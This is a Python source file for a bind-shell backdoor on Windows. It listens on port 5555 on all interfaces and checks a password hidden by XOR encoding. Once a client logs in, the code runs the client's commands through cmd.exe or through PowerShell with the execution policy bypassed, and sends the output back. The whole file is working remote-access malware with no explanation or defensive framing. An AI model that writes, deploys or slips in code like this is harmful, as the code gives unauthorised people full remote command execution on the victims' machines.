import socket, subprocess, threading

HOST = '0.0.0.0'
PORT = 5555
XOR_KEY = 0x5A
ENC_PASS = [0x35, 0x0B, 0x1B, 0x1A, 0x1B, 0x0D, 0x1B, 0x0B, 0x1B, 0x1B, 0x1B, 0x1B]

def get_password():
    return ''.join(chr(b ^ XOR_KEY) for b in ENC_PASS)

def recv_line(conn):
    data = b""
    while not data.endswith(b"\n"):
        chunk = conn.recv(4096)
        if not chunk:
            return None
        data += chunk
    return data.decode(errors="ignore").strip()

def handle(conn, addr):
    shell = "cmd"
    try:
        conn.sendall(b"AUTH_REQUIRED\n")
        if recv_line(conn) != get_password():
            conn.sendall(b"ACCESS_DENIED\n")
            return
        conn.sendall(b"AUTH_OK\nREADY\n")
        while True:
            cmd = recv_line(conn)
            if cmd is None:
                break
            if not cmd:
                continue
            low = cmd.lower().strip()
            if low in ("exit", "quit"):
                conn.sendall(b"BYE\n")
                break
            if low in ("!ps", "!powershell"):
                shell = "powershell"
                conn.sendall(b"[MODE: PowerShell]\n<<END>>\n")
                continue
            if low == "!cmd":
                shell = "cmd"
                conn.sendall(b"[MODE: CMD]\n<<END>>\n")
                continue
            try:
                if shell == "powershell":
                    full = ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd]
                else:
                    full = ["cmd.exe", "/c", cmd]
                r = subprocess.run(full, capture_output=True, text=True,
                                   timeout=600, encoding='utf-8', errors='ignore')
                out = (r.stdout or "") + (r.stderr or "")
                if not out.strip():
                    out = "[No output]\n"
                conn.sendall(out.encode() + b"\n<<END>>\n")
            except subprocess.TimeoutExpired:
                conn.sendall(b"[TIMEOUT 600s]\n<<END>>\n")
            except Exception as e:
                conn.sendall(f"[ERROR] {e}\n<<END>>\n".encode())
    except Exception:
        pass
    finally:
        try: conn.close()
        except: pass

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(10)
    while True:
        try:
            c, a = s.accept()
            threading.Thread(target=handle, args=(c, a), daemon=True).start()
        except Exception:
            continue

if __name__ == "__main__":
    main()